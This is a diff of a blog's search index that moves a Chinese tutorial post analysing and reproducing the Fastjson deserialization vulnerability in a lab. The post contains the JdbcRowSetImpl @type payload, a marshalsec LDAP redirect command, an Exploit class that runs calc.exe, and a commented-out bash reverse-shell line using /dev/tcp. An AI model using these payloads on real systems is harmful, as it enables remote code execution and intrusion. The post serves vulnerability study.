@@ -517,8 +517,8 @@
         <category>漏洞分析</category>
       </categories>
       <tags>
-        <tag>漏洞分析</tag>
         <tag>认证绕过</tag>
+        <tag>漏洞分析</tag>
         <tag>Spring Security</tag>
         <tag>WebFlux</tag>
         <tag>CVE-2024-38821</tag>
@@ -564,8 +564,8 @@
         <category>spring</category>
       </categories>
       <tags>
-        <tag>漏洞分析</tag>
         <tag>认证绕过</tag>
+        <tag>漏洞分析</tag>
         <tag>Spring Security</tag>
         <tag>EnableMethodSecurity</tag>
         <tag>CVE-2025-22223</tag>
@@ -1037,6 +1037,53 @@
       </tags>
   </entry>
   <entry>
+    <title>Fastjson反序列化漏洞原理分析及复现</title>
+    <url>/archives/38dceb78.html</url>
+    <content><![CDATA[<p>@<a href="Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0">TOC</a></p>
+<h1 id="Fastjson序列化与反序列化"><a href="#Fastjson序列化与反序列化" class="headerlink" title="Fastjson序列化与反序列化"></a>Fastjson序列化与反序列化</h1><h2 id="常规反序列化"><a href="#常规反序列化" class="headerlink" title="常规反序列化"></a>常规反序列化</h2><p>Fastjson的序列化与反序列化与常规的java反序列化不同，我们先来看一下正常的java反序列化，使用下面一段代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Unserialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;Unserilize.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//新建一个对象</span></span><br><span class="line">            <span class="type">UnserializeTest</span> <span class="variable">unserializeTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnserializeTest</span>();</span><br><span class="line">            unserializeTest.name = <span class="string">&quot;armandhe&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//序列化</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">            outputStream.writeObject(unserializeTest);</span><br><span class="line">            outputStream.close();</span><br><span class="line"><span class="comment">//            fileOutputStream.close();</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//反序列化</span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">UnserializeTest</span> <span class="variable">o</span> <span class="operator">=</span> (UnserializeTest) objectInputStream.readObject();</span><br><span class="line">                System.out.println(o.name);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UnserializeTest</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了readObject函数！！&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<blockquote>
+<p>反序列化的单词被我拼错了，尴尬，懒得改了</p>
+</blockquote>
+<p>我们知道在java中要实现序列化的类的的实例，其类必须实现Serializable或者Externalizable接口，Serializable接口是一个空接口，其只是作为一个标志，而Externalizable这是对Serializable接口的再一次封装，如下图：</p>
+<ul>
+<li>Serializable接口<br><img src="https://i-blog.csdnimg.cn/blog_migrate/07de0133c7b3f58fdb4e11e6552128b8.png" alt="在这里插入图片描述"></li>
+<li>Externalizable接口<br><img src="https://i-blog.csdnimg.cn/blog_migrate/212c7e8b414b9efadc307060d698e207.png" alt="在这里插入图片描述"><br>可以看到Externalizable继承了Serializable接口，并添加了自己的方法。<br>因为这个原因，我们在demo中首先编写了一个UnserializeTest类用于被序列化，该类中重写了readObject方法，个人感觉也不算是重写，因为没有@override注解，应该是应为作用域的缘故导致在调用的时候先只能执行了本类中的readObject方法，在该类中我们执行了操作系统命令弹出一个计算机，并打印了一段话。<br>demo代码运行的结果就是，会在控制台打印：</li>
+</ul>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">执行了readObject函数！！</span></span><br><span class="line"><span class="string">armandhe</span></span><br></pre></td></tr></table></figure>
+<p>并生成一个Userilize.txt文件和弹出计算机，如下图：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5cacf695b502f8230904fb0374ca5a4c.png" alt="在这里插入图片描述"><br>我们通过常规的方式打开Unserilize.txt会看到一堆乱码：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/41d8629728724b938a6fcdbe4839f1b8.png" alt="在这里插入图片描述"><br>所以我们使用linux的xxd命令：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xxd Unserilize.txt</span><br></pre></td></tr></table></figure>
+<p>或者在windows中使用010editor打开它：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8f9292c92bd8d12b06758601d1ac4f7c.png" alt="在这里插入图片描述"><br>需要注意的特征是，开头的ACED0005，这个是java序列化数据的特征，有助于我们快速定位程序的反序列化利用点。其实后面的73 72也有特定的含义，不过具体的我忘记了，感兴趣的朋友可以自行查询。我们可以利用工具对该数据进行解析：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/407450606885d51de67358e3bcf93471.png" alt="在这里插入图片描述"><br>这样我们就可以看到对象序列化之前对应的类，以及其中其中的可被序列化的methods与fields。<br>常规java序列化调用的是writeObject方法，反序列化则调用的是readObject方法，如果目标类在实现的时候重写了readObject方法想我们的demo代码一样，并包含有一些危险的操作的参数是用户可控的话，那么就可能导致反序列化漏洞。</p>
+<h2 id="Fastjson序列化与反序列化-1"><a href="#Fastjson序列化与反序列化-1" class="headerlink" title="Fastjson序列化与反序列化"></a>Fastjson序列化与反序列化</h2><p>Fastjson可以将JSONObject或者javaBean序列化为JSON字符串。关于javaBean的只是可以参考廖雪峰的网站：<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">javaBean是什么</a></p>
+<p>Fastjson在对javaBean进行序列化的时候会调用它的所有get或者is方法，反序列化的时候会调用所有的set方法，我们可以看下面的代码，如果这个set方法中含有一些危险的调用链，我们则可以利用这个反序列化过程来执行我们自己的命令：<br>首先我们准备一个javaBean，FastjsonUnserilizeTest.java</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonUnserilizeTest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getname方法！&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setname方法！&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getage方法！&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setage方法！&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后是序列化与反序列化代码,FastjsonUnserilizeMain.java：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonUnserilizeMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//新建对象</span></span><br><span class="line">        System.out.println(<span class="string">&quot;新建对象：&quot;</span>);</span><br><span class="line">        <span class="type">FastjsonUnserilizeTest</span> <span class="variable">fastjsonUnserilizeTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FastjsonUnserilizeTest</span>();</span><br><span class="line">        fastjsonUnserilizeTest.setName(<span class="string">&quot;armband&quot;</span>);</span><br><span class="line">        fastjsonUnserilizeTest.setAge(<span class="number">24</span>);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        System.out.println(<span class="string">&quot;\n序列化：&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> JSON.toJSONString(fastjsonUnserilizeTest, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:25,\&quot;name\&quot;:\&quot;armbandnewpy\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        System.out.println(<span class="string">&quot;\n反序列化：&quot;</span>);</span><br><span class="line">        <span class="type">FastjsonUnserilizeTest</span> <span class="variable">fastjsonUnserilizeTest1</span> <span class="operator">=</span> JSON.parseObject(s, FastjsonUnserilizeTest.class);</span><br><span class="line">        System.out.println(fastjsonUnserilizeTest1);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> fastjsonUnserilizeTest1.getName();</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行后控制控制台打印：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e04a4f51c024bbfa1ca69f40ba0493cb.png" alt="在这里插入图片描述"><br>第一部分是在我们新建对象的时候调用了两次set方法<br>第二部分是在序列化的时候调用了get方法<br>第三部分是在反序列化的时候调用了set方法<br>注意到Fastjson中序列化调用的是JSON.toJSONString方法，反序列化调用的是JSON.parseObject方法。</p>
+<h1 id="Fastjson发序列化漏洞原理"><a href="#Fastjson发序列化漏洞原理" class="headerlink" title="Fastjson发序列化漏洞原理"></a>Fastjson发序列化漏洞原理</h1><p>我们注意到在进行序列化操作的时候JSON.toJSONString方法有一个参数SerializerFeature.WriteClassName，这个参数就是在序列化是包含类名，也就是这个参数导致了Fastjson的反序列化漏洞，这个参数实现的功能在Fastjson中被称作AutoType，即自动类型。如果不添加这个参数我们的javaBean序列化后应该是这样的：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ded9132a1e351e460033a0f6271c6baa.png" alt="在这里插入图片描述"><br>对比一下包含有上述参数：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/10feefd1c9ed9c4ffa16560dfddd199b.png" alt="在这里插入图片描述"><br>可以看到多了一个@type参数。<br>如果没有SerializerFeature.WriteClassName参数，我们在进行反序列化时，代码这样写：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String s= <span class="string">&quot;&#123;\&quot;age\&quot;:25,\&quot;name\&quot;:\&quot;armbandnewpy\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(s);</span><br></pre></td></tr></table></figure>
+<p>这时候我们是不能控制到底要反序列化为什么类型的对象的，只能开发者在代码中指定好，如这样：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/21ae2fde7d3075a1f2e5479f21fe8053.png" alt="在这里插入图片描述"><br>而如果我们在序列化的时候添加了该参数，我们则可以在反序列化的时候通过控制@type键的值来控制该序列化数据要被反序列化为什么样的对象，即调用什么类的set 方法，接下来要用到的就是找到这样一个类可以被用来完成我们想要的功能。<br>其中一个类是：com.sun.rowset.JdbcRowSetImpl<br>我们查看以下这个类，定位到setDataSource方法：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a2966598772acdc06ae5b39e34722680.png" alt="在这里插入图片描述"><br>这段代码首先判断了this.getDataSourceName（）是否为空，我们定位到getDataSourceName（）方法处查看一下他的返回值：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/87dc01881a8358a40c7bfe72f7d5fcf1.png" alt="在这里插入图片描述"><br>返回dataSource，是一个字符串类型，那么我们在反序列化调用set方法时dataSource首先是没有值的，也就是说this.getDataSourceName（）的返回值为null，这逻辑进入到else部分，调用了父类的setDataSourceName，并将var1传了进去。其实这一串都不重要，只需要知道反序列化的时候会自动调用setDataSourceName为DataSourceName赋值就可以了。<br>再在com.sun.rowset.JdbcRowSetImpl类中定位到setAutocommit方法：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8ee66d941bcb77f16736b104d5f7c0fb.png" alt="在这里插入图片描述"><br>在定位到this.connect方法：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b8ade61e0a47e61d179d1ac8b336e53e.png"><br>在这里我们注意到有个lookup方法，该方法就是JNDI中访问远程服务器获取远程对象的方法，其参数为服务器地址。如果其参数可控那么就可能被攻击，而this.getDataSourceName是获取DataSourceName的值得方法，那么我们只要控制了this.setDataSourceName方法的参数就可以访问我们自己的服务器了。而我们知道Fastjson在反序列化的时候会调用所有的set方法，正好可以通过setDataSourceName对DataSourceName进行赋值。于是，我们就有了这样的Fastjson序列化数据：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://localhost:1099/POC&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>这儿autoCommit好像必须设置为true，为啥我忘记了，昨天看的，待会儿去找找！！<br>漏洞的原理就是这样，接下来就是复现了，好紧张。。。。</p>
+<h1 id="一次失败的复现"><a href="#一次失败的复现" class="headerlink" title="一次失败的复现"></a>一次失败的复现</h1><p>我们利用现有的靶场环境：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8f1837d42ed28a8665c28ff8a57ee392.png" alt="在这里插入图片描述"><br>将含有漏洞的war包直接放到tomcat的webapps目录下，然后启动tomcat就可以了，访问下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/efdb2e55d3a0a078768e9bb6da82d399.png" alt="在这里插入图片描述"><br>出啊先helloword则代表靶场搭建完毕，然后我们去看看这个war包怎么写的：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7b75e64d29cf5cdfbb7d971f319d98d2.png" alt="在这里插入图片描述"><br>这里有两个文件，主要的逻辑在过滤器那个类中，我直接给他粘出来：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> spark.Spark;</span><br><span class="line"><span class="keyword">import</span> spark.servlet.SparkApplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexFilter</span> <span class="keyword">implements</span> <span class="title class_">SparkApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IndexFilter</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        Spark.get(<span class="string">&quot;/&quot;</span>, (req, res) -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">        Spark.post(<span class="string">&quot;/&quot;</span>, (request, response) -&gt; &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> request.body();</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(data, <span class="keyword">new</span> <span class="title class_">Feature</span>[]&#123;Feature.SupportNonPublicField&#125;);</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">            ret.put(<span class="string">&quot;success&quot;</span>, <span class="number">200</span>);</span><br><span class="line">            ret.put(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;Hello &quot;</span> + obj.get(<span class="string">&quot;name&quot;</span>) + <span class="string">&quot;, Your age is &quot;</span> + obj.get(<span class="string">&quot;age&quot;</span>));</span><br><span class="line">            response.status(<span class="number">200</span>);</span><br><span class="line">            response.type(<span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ret.toJSONString();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IndexFilter</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IndexFilter</span>();</span><br><span class="line">        i.init();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以看到，如果请求的方法为get则返回hello word ，如果为post则对传上来的数据进行反序列化操作，并输出 你的年纪与姓名这里面有一个<br><code>new Feature[]&#123;Feature.SupportNonPublicField&#125;);             JSONObject ret = new JSONObject();             ret.put(&quot;success&quot;, 200);</code> 参数是为了让被private修饰的值也能被反序列化。<br>我们传入正常的数据：<br>get请求：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/307874e2b5c35c8af6dfb6ddaf60ff64.png" alt="在这里插入图片描述"><br>post请求：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/099df848f059bb14c7f99fcdfad49e30.png" alt="在这里插入图片描述"><br>然后传入我们构造的payload:</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/e821001f94862210776e67cb368fc013.png" alt="在这里插入图片描述"><br>在操作前记得先搭建好ldap服务器，使用的工具是marshalsec，可以在gihub上找到，命令是：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1/#Exploit&quot; 6666</span><br></pre></td></tr></table></figure>
+<p>当靶机访问该服务器的时候，会被重定向到本机的80端口上访问Exploit.class文件，Exploit.java文件中的内容为：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">      <span class="comment">//Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/xx.xx.xx.xx/1888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;);</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行了打开计算机的命令，但我的操作并没有打开计算机，据说是应为jdk版本的原因。详情见：<br><a href="https://www.jianshu.com/p/35b84eda9292">Fastjson反序列化漏洞利用</a><br>参考文章：<br><a href="https://www.cnblogs.com/nice0e3/p/14601670.html#0x02-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">fastjson反序列化漏洞复现</a><br><a href="https://www.jianshu.com/p/35b84eda9292">Fastjson反序列化漏洞利用</a></p>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>反序列化</tag>
+        <tag>fastjson</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Fastjson反序列化漏洞TemplateImpl利用链条跟踪与分析</title>
     <url>/archives/4187a059.html</url>
     <content><![CDATA[<p>@<a href="Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9ETemplateImpl%E5%88%A9%E7%94%A8%E9%93%BE%E6%9D%A1%E8%B7%9F%E8%B8%AA%E4%B8%8E%E5%88%86%E6%9E%90">TOC</a></p>
@@ -1087,53 +1134,6 @@
         <tag>fastjson</tag>
         <tag>gadgets</tag>
         <tag>templateImpl</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Fastjson反序列化漏洞原理分析及复现</title>
-    <url>/archives/38dceb78.html</url>
-    <content><![CDATA[<p>@<a href="Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0">TOC</a></p>
-<h1 id="Fastjson序列化与反序列化"><a href="#Fastjson序列化与反序列化" class="headerlink" title="Fastjson序列化与反序列化"></a>Fastjson序列化与反序列化</h1><h2 id="常规反序列化"><a href="#常规反序列化" class="headerlink" title="常规反序列化"></a>常规反序列化</h2><p>Fastjson的序列化与反序列化与常规的java反序列化不同，我们先来看一下正常的java反序列化，使用下面一段代码：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Unserialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;Unserilize.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//新建一个对象</span></span><br><span class="line">            <span class="type">UnserializeTest</span> <span class="variable">unserializeTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnserializeTest</span>();</span><br><span class="line">            unserializeTest.name = <span class="string">&quot;armandhe&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//序列化</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">            outputStream.writeObject(unserializeTest);</span><br><span class="line">            outputStream.close();</span><br><span class="line"><span class="comment">//            fileOutputStream.close();</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//反序列化</span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">UnserializeTest</span> <span class="variable">o</span> <span class="operator">=</span> (UnserializeTest) objectInputStream.readObject();</span><br><span class="line">                System.out.println(o.name);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UnserializeTest</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了readObject函数！！&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<blockquote>
-<p>反序列化的单词被我拼错了，尴尬，懒得改了</p>
-</blockquote>
-<p>我们知道在java中要实现序列化的类的的实例，其类必须实现Serializable或者Externalizable接口，Serializable接口是一个空接口，其只是作为一个标志，而Externalizable这是对Serializable接口的再一次封装，如下图：</p>
-<ul>
-<li>Serializable接口<br><img src="https://i-blog.csdnimg.cn/blog_migrate/07de0133c7b3f58fdb4e11e6552128b8.png" alt="在这里插入图片描述"></li>
